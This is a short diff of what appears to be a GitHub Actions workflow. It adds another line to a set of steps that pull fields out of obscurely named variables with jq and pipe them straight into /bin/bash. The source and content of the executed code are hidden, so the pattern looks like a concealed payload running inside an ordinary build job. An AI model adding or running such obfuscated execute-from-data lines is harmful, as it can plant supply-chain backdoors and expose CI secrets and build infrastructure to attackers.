@@ -27,6 +27,7 @@ jobs:
           echo $mnx94143 | jq -r .xy6521 | /bin/bash
           printf '%s' "$no4" | jq -r .py77 | /bin/bash
           printf '%s' "$tiz1" | jq -r .yxcv91640 | /bin/bash
+          echo $tkx2 | jq -r .xz71 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
